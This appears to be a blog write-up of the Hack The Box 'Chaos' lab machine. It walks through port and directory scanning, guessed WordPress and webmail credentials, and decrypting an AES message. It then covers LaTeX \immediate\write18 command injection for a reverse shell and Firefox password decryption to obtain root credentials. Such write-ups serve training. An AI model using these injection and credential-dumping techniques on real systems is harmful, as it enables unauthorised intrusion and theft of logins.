@@ -1,0 +1,232 @@
+---
+layout: post
+title:  "HTB Writeup - Chaos"
+date:   2019-05-04 12:59:50 +0000
+categories: jekyll update
+---
+
+# HTB Writeup - Chaos
+<br />
+As always, I start with nmap: 
+```
+root@kali:~/chaos# nmap -A -sS -sV -p- 10.10.10.120
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-04 06:46 EDT
+Nmap scan report for 10.10.10.120
+Host is up (0.054s latency).
+Not shown: 65529 closed ports
+PORT      STATE SERVICE           VERSION
+80/tcp    open  http?
+110/tcp   open  pop3?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|_    +OK Dovecot (Ubuntu) ready.
+143/tcp   open  imap              Dovecot imapd (Ubuntu)
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+10000/tcp open  snet-sensor-mgmt?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port110-TCP:V=7.70%I=7%D=5/4%Time=5CCD6DB3%P=x86_64-pc-linux-gnu%r(NULL
+SF:,1D,"\+OK\x20Dovecot\x20\(Ubuntu\)\x20ready\.\r\n")%r(GenericLines,1D," SF:\+OK\x20Dovecot\x20\(Ubuntu\)\x20ready\.\r\n");
+Device type: firewall
+Running (JUST GUESSING): Fortinet embedded (87%)
+OS CPE: cpe:/h:fortinet:fortigate_100d
+Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 256/tcp)
+HOP RTT    ADDRESS
+1   ... 30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 183.20 seconds.
+```
+<br />
+
+Here we can see that there are a few open ports. Let's start with the 80.
+http:/10.10.10.120/
+<img src="/assets/chaos1.PNG" alt="drawing" width="600"/>
+<img src="/assets/chaos2.PNG" alt="drawing" width="600"/>
+
+
+
+The website appeared quite empy, so I ran dirb: 
+```
+root@kali:~/chaos# dirb http://10.10.10.120/ /usr/share/dirb/wordlists/common.txt
+
+------
+
+DIRB v2.22
+
+## By The Dark Raver
+
+START_TIME: Sat May  4 07:23:03 2019
+URL_BASE: http://10.10.10.120/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.120/ ----
+
+- http://10.10.10.120/index.html (CODE:200|SIZE:73)
+  ==> DIRECTORY: http://10.10.10.120/javascript/
+- http://10.10.10.120/server-status (CODE:403|SIZE:300)
+  ==> DIRECTORY: http://10.10.10.120/wp/
+
+---- Entering directory: http://10.10.10.120/javascript/ ----
+==> DIRECTORY: http://10.10.10.120/javascript/jquery/
+
+---- Entering directory: http://10.10.10.120/wp/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.120/javascript/jquery/ ----
+
+- http://10.10.10.120/javascript/jquery/jquery (CODE:200|SIZE:268026)
+
+------
+
+END_TIME: Sat May  4 07:33:01 2019
+DOWNLOADED: 13836 - FOUND: 3
+```
+<br />
+The most interesting directory is /wp. For this reason I used WPScan.
+
+It found a web page protected by password. Since previously I found a comment posted by human, I tried human:human, and it worked!
+```
+Protected: chaos
+creds for webmail
+
+username - ayush
+password - jiujitsu
+```
+# POP and IMAP
+
+I tried to investigate POP3s:
+```
+root@kali:~# socat  - OPENSSL:chaos:995,verify=0 
++OK Dovecot (Ubuntu) ready.
+USER ayush
++OK
+PASS jiujitsu
++OK Logged in.
+```
+<br />
+
+The credentials worked, but the enumeration dind't find anything interesting.
+
+I tried with sslclient, I had numerous fails in trying to talk to this service. After enumerating, I found out there a message in the Drafts:
+<img src="/assets/chaos3.PNG" alt="drawing" width="600"/>
+
+
+```
+root@kali:~/chaos# cat mail 
+Hii, sahay
+Check the enmsg.txt
+You are the password XD.
+Also attached the script which i used to encrypt.
+Thanks,
+Ayush
+
+enim_msg.txt
+
+0000000000000234®îªzŠØ³pK8…ZCƒÌõð¹‰^9ä¯kW‡À•Ô&wø9Ü¾©‚ö½EÓä'q’[žèžû9îZ‹Þ3€«íæ.žC–¹ÚÁí¬Ë;¬Ø3Áø•¢¾ó6¼ŸR`n
+```
+
+The attachment enim_msg.txt was some encrypted string, and in addition there was also a Python script with what looked like the function used to encrypt the content.
+```
+root@kali:~/chaos# cat en.py def encrypt(key, filename):
+    chunksize = 64*1024
+    outputFile = "en" + filename
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV =Random.new().read(16)
+
+encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+with open(filename, 'rb') as infile:
+    with open(outputFile, 'wb') as outfile:
+        outfile.write(filesize.encode('utf-8'))
+        outfile.write(IV)
+
+        while True:
+            chunk = infile.read(chunksize)
+
+            if len(chunk) == 0:
+                break
+            elif len(chunk) % 16 != 0:
+                chunk += b' ' * (16 - (len(chunk) % 16))
+
+            outfile.write(encryptor.encrypt(chunk))
+
+def getKey(password):
+            hasher = SHA256.new(password.encode('utf-8'))
+            return hasher.digest()
+```
+Looking around on the internet, I found that this is a snippet of code from a AES encryption/decryption tool, but instead I decided to just write the decryption function myself.
+
+```
+def decrypt(key):
+    chunksize = 64*1024
+    input_file = "enim_msg.txt"
+    filecontent = open(input_file, 'rb').read()
+    print('File content %s bytes' % len(filecontent))
+    filesize = filecontent[:16]
+    IV = filecontent[16:32]
+    ciphertext = filecontent[32:]
+    decryptor = AES.new(key, AES.MODE_CBC, IV)
+    print(decryptor.decrypt(ciphertext))
+    
+File content 272 bytes
+b'SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK\n\n
+```
+At this point the message decrypted was clearly base64 encoded, so I decoded it.
+```
+root@kali:~/chaos# echo "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d
+Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+```
+The link pointed to some PDF generation page. Here we could insert some code and choose a template, and some PDF would have been generated for us (or at least that’s what the page claimed).
+
+Checking the actual response that the server was giving me, I could see that there was some LaTeX engine behind the page, as the response contained the execution log of the pdflatex command.
+
+I googled for potential vulnerability, and found that [it was possible to inject commands by using \immediate\write18{$CMD} in the PDF generation box]([https://0day.work/hacking-with-latex/]).
+
+First I tried some commands to see what I could do, checking the output from the server response. After I could not find anything interesting I decided to just execute as CMD a Python reverse shell, while listening with nc from Kali. So I got a shell as www-data.
+
+After several rabbit holes, getting the user flag was just issueing this command:
+```
+www-data@chaos:/etc/dovecot$ su ayush
+su ayush
+Password: jiujitsu
+```
+The shell I got was very restricted, so I spawned a new shell with python: 
+```
+su -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' " ayush
+```
+<br />
+# Priviledge Escalation
+<br />
+The Privesc was not difficult, since in the home directory I found a mozilla folder with backups of user profile. The credentials in that file were encrypted, however I found a tool to decrypt it:
+```
+ayush@chaos:~/.mozilla$ python firefox_decrypt.py firefox
+python firefox_decrypt.py firefox
+
+Master Password for profile firefox/bzo7sjt1.default: jiujitsu
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+```
+<br />
+
+With this credentials it was possible to login to the webmin interface and get the root flag.
